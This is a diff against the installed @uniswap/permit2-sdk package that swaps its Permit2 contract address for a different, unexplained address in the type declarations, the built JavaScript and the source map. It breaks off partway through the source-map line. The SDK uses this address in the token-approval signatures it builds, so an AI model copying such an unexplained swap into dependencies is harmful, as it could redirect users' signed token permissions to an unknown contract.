diff --git a/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts b/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts
index 57292f1..c6e34ba 100644
--- a/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts
+++ b/node_modules/@uniswap/permit2-sdk/dist/constants.d.ts
@@ -1,5 +1,5 @@
 import { BigNumber } from '@ethersproject/bignumber';
-export declare const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+export declare const PERMIT2_ADDRESS = "0x00000000BD0047637ac6BA3af44b52005ceD9557";
 export declare const MaxUint48: BigNumber;
 export declare const MaxUint160: BigNumber;
 export declare const MaxUint256: BigNumber;
diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js
index dfb5e1b..a68bcf6 100644
--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js
+++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js
@@ -9,7 +9,7 @@ var hash = require('@ethersproject/hash');
 var bignumber = require('@ethersproject/bignumber');
 var contracts = require('@ethersproject/contracts');
 
-var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+var PERMIT2_ADDRESS = '0x00000000BD0047637ac6BA3af44b52005ceD9557';
 var MaxUint48 = /*#__PURE__*/bignumber.BigNumber.from('0xffffffffffff');
 var MaxUint160 = /*#__PURE__*/bignumber.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
 var MaxUint256 = /*#__PURE__*/bignumber.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
diff --git a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js.map b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js.map
index d261969..c2c9bc5 100644
--- a/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js.map
+++ b/node_modules/@uniswap/permit2-sdk/dist/permit2-sdk.cjs.development.js.map
@@ -1 +1 @@
-{"version":3,"file":"permit2-sdk.cjs.development.js","sources":["../src/constants.ts","../src/domain.ts","../src/allowanceTransfer.ts","../src/signatureTransfer.ts","../src/providers/AllowanceProvider.ts"],"sourcesContent":["import { BigNumber } from '@ethersproject/bignumber'\n\nexport const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'\n\nexport const MaxUint48 = BigNumber.from('0xffffffffffff')\nexport const MaxUint160 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff')\nexport const MaxUint256 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n\n// alias max types for their usages\n// allowance transfer types\nexport const MaxAllowanceTransferAmount = MaxUint160\nexport const MaxAllowanceExpiration = MaxUint48\nexport const MaxOrderedNonce = MaxUint48\n\n// signature transfer types\nexport const MaxSignatureTransferAmount = MaxUint256\nexport const MaxUnorderedNonce = MaxUint256\nexport const MaxSigDeadline = MaxUint256\n\nexport const InstantExpiration: BigNumber = BigNumber.from(0)\n","import { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\n\nconst PERMIT2_DOMAIN_NAME = 'Permit2'\n\nexport function permit2Domain(permit2Address: string, chainId: number): TypedDataDomain {\n  return {\n    name: PERMIT2_DOMAIN_NAME,\n    chainId,\n    verifyingContract: permit2Address,\n  }\n}\n\nexport type PermitData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: any\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { MaxSigDeadline, MaxOrderedNonce, MaxAllowanceTransferAmount, MaxAllowanceExpiration } from './constants'\nimport { permit2Domain } from './domain'\n\nexport interface PermitDetails {\n  token: string\n  amount: BigNumberish\n  expiration: BigNumberish\n  nonce: BigNumberish\n}\n\nexport interface PermitSingle {\n  details: PermitDetails\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport interface PermitBatch {\n  details: PermitDetails[]\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport type PermitSingleData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitSingle\n}\n\nexport type PermitBatchData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatch\n}\n\nconst PERMIT_DETAILS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint160' },\n  { name: 'expiration', type: 'uint48' },\n  { name: 'nonce', type: 'uint48' },\n]\n\nconst PERMIT_TYPES = {\n  PermitSingle: [\n    { name: 'details', type: 'PermitDetails' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nconst PERMIT_BATCH_TYPES = {\n  PermitBatch: [\n    { name: 'details', type: 'PermitDetails[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nfunction isPermit(permit: PermitSingle | PermitBatch): permit is PermitSingle {\n  return !Array.isArray(permit.details)\n}\n\nexport abstract class AllowanceTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitSingle | PermitBatch,\n    permit2Address: string,\n    chainId: number\n  ): PermitSingleData | PermitBatchData {\n    invariant(MaxSigDeadline.gte(permit.sigDeadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermit(permit)) {\n      validatePermitDetails(permit.details)\n      return {\n        domain,\n        types: PERMIT_TYPES,\n        values: permit,\n      }\n    } else {\n      permit.details.forEach(validatePermitDetails)\n      return {\n        domain,\n        types: PERMIT_BATCH_TYPES,\n        values: permit,\n      }\n    }\n  }\n\n  public static hash(permit: PermitSingle | PermitBatch, permit2Address: string, chainId: number): string {\n    const { domain, types, values } = AllowanceTransfer.getPermitData(permit, permit2Address, chainId)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validatePermitDetails(details: PermitDetails) {\n  invariant(MaxOrderedNonce.gte(details.nonce), 'NONCE_OUT_OF_RANGE')\n  invariant(MaxAllowanceTransferAmount.gte(details.amount), 'AMOUNT_OUT_OF_RANGE')\n  invariant(MaxAllowanceExpiration.gte(details.expiration), 'EXPIRATION_OUT_OF_RANGE')\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { permit2Domain } from './domain'\nimport { MaxSigDeadline, MaxUnorderedNonce, MaxSignatureTransferAmount } from './constants'\n\nexport interface Witness {\n  witness: any\n  witnessTypeName: string\n  witnessType: Record<string, TypedDataField[]>\n}\n\nexport interface TokenPermissions {\n  token: string\n  amount: BigNumberish\n}\n\nexport interface PermitTransferFrom {\n  permitted: TokenPermissions\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport interface PermitBatchTransferFrom {\n  permitted: TokenPermissions[]\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport type PermitTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitTransferFrom\n}\n\nexport type PermitBatchTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatchTransferFrom\n}\n\nconst TOKEN_PERMISSIONS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint256' },\n]\n\nconst PERMIT_TRANSFER_FROM_TYPES = {\n  PermitTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nconst PERMIT_BATCH_TRANSFER_FROM_TYPES = {\n  PermitBatchTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nfunction permitTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction permitBatchTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitBatchWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions[]' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction isPermitTransferFrom(permit: PermitTransferFrom | PermitBatchTransferFrom): permit is PermitTransferFrom {\n  return !Array.isArray(permit.permitted)\n}\n\nexport abstract class SignatureTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): PermitTransferFromData | PermitBatchTransferFromData {\n    invariant(MaxSigDeadline.gte(permit.deadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n    invariant(MaxUnorderedNonce.gte(permit.nonce), 'NONCE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermitTransferFrom(permit)) {\n      validateTokenPermissions(permit.permitted)\n      const types = witness ? permitTransferFromWithWitnessType(witness) : PERMIT_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    } else {\n      permit.permitted.forEach(validateTokenPermissions)\n      const types = witness ? permitBatchTransferFromWithWitnessType(witness) : PERMIT_BATCH_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    }\n  }\n\n  public static hash(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): string {\n    const { domain, types, values } = SignatureTransfer.getPermitData(permit, permit2Address, chainId, witness)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validateTokenPermissions(permissions: TokenPermissions) {\n  invariant(MaxSignatureTransferAmount.gte(permissions.amount), 'AMOUNT_OUT_OF_RANGE')\n}\n","import { BigNumber } from '@ethersproject/bignumber'\nimport { Provider } from '@ethersproject/providers'\nimport Permit2Abi from '../../abis/Permit2.json'\nimport { Contract } from '@ethersproject/contracts'\n\nexport interface AllowanceData {\n  amount: BigNumber\n  nonce: number\n  expiration: number\n}\n\nexport class AllowanceProvider {\n  private permit2: Contract\n\n  constructor(private provider: Provider, private permit2Address: string) {\n    this.permit2 = new Contract(this.permit2Address, Permit2Abi, this.provider)\n  }\n\n  async getAllowanceData(token: string, owner: string, spender: string): Promise<AllowanceData> {\n    return await this.permit2.allowance(owner, token, spender)\n  }\n\n  async getAllowance(token: string, owner: string, spender: string): Promise<BigNumber> {\n    return (await this.getAllowanceData(token, owner, spender)).amount\n  }\n\n  async getNonce(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).nonce\n  }\n\n  async getExpiration(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).expiration\n  }\n}\n"],"names":["PERMIT2_ADDRESS","MaxUint48","BigNumber","from","MaxUint160","MaxUint256","MaxAllowanceTransferAmount","MaxAllowanceExpiration","MaxOrderedNonce","MaxSignatureTransferAmount","MaxUnorderedNonce","MaxSigDeadline","InstantExpiration","PERMIT2_DOMAIN_NAME","permit2Domain","permit2Address","chainId","name","verifyingContract","PERMIT_DETAILS","type","PERMIT_TYPES","PermitSingle","PermitDetails","PERMIT_BATCH_TYPES","PermitBatch","isPermit","permit","Array","isArray","details","AllowanceTransfer","getPermitData","gte","sigDeadline","invariant","domain","validatePermitDetails","types","values","forEach","hash","_TypedDataEncoder","nonce","amount","expiration","TOKEN_PERMISSIONS","PERMIT_TRANSFER_FROM_TYPES","PermitTransferFrom","TokenPermissions","PERMIT_BATCH_TRANSFER_FROM_TYPES","PermitBatchTransferFrom","permitTransferFromWithWitnessType","witness","PermitWitnessTransferFrom","witnessTypeName","witnessType","permitBatchTransferFromWithWitnessType","PermitBatchWitnessTransferFrom","isPermitTransferFrom","permitted","SignatureTransfer","deadline","validateTokenPermissions","Object","assign","permissions","AllowanceProvider","provider","permit2","Contract","Permit2Abi","getAllowanceData","token","owner","spender","allowance","getAllowance","getNonce","getExpiration"],"mappings":"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"}
\ No newline at end of file
+{"version":3,"file":"permit2-sdk.cjs.development.js","sources":["../src/constants.ts","../src/domain.ts","../src/allowanceTransfer.ts","../src/signatureTransfer.ts","../src/providers/AllowanceProvider.ts"],"sourcesContent":["import { BigNumber } from '@ethersproject/bignumber'\n\nexport const PERMIT2_ADDRESS = '0x00000000BD0047637ac6BA3af44b52005ceD9557'\n\nexport const MaxUint48 = BigNumber.from('0xffffffffffff')\nexport const MaxUint160 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff')\nexport const MaxUint256 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n\n// alias max types for their usages\n// allowance transfer types\nexport const MaxAllowanceTransferAmount = MaxUint160\nexport const MaxAllowanceExpiration = MaxUint48\nexport const MaxOrderedNonce = MaxUint48\n\n// signature transfer types\nexport const MaxSignatureTransferAmount = MaxUint256\nexport const MaxUnorderedNonce = MaxUint256\nexport const MaxSigDeadline = MaxUint256\n\nexport const InstantExpiration: BigNumber = BigNumber.from(0)\n","import { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\n\nconst PERMIT2_DOMAIN_NAME = 'Permit2'\n\nexport function permit2Domain(permit2Address: string, chainId: number): TypedDataDomain {\n  return {\n    name: PERMIT2_DOMAIN_NAME,\n    chainId,\n    verifyingContract: permit2Address,\n  }\n}\n\nexport type PermitData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: any\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { MaxSigDeadline, MaxOrderedNonce, MaxAllowanceTransferAmount, MaxAllowanceExpiration } from './constants'\nimport { permit2Domain } from './domain'\n\nexport interface PermitDetails {\n  token: string\n  amount: BigNumberish\n  expiration: BigNumberish\n  nonce: BigNumberish\n}\n\nexport interface PermitSingle {\n  details: PermitDetails\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport interface PermitBatch {\n  details: PermitDetails[]\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport type PermitSingleData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitSingle\n}\n\nexport type PermitBatchData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatch\n}\n\nconst PERMIT_DETAILS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint160' },\n  { name: 'expiration', type: 'uint48' },\n  { name: 'nonce', type: 'uint48' },\n]\n\nconst PERMIT_TYPES = {\n  PermitSingle: [\n    { name: 'details', type: 'PermitDetails' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nconst PERMIT_BATCH_TYPES = {\n  PermitBatch: [\n    { name: 'details', type: 'PermitDetails[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nfunction isPermit(permit: PermitSingle | PermitBatch): permit is PermitSingle {\n  return 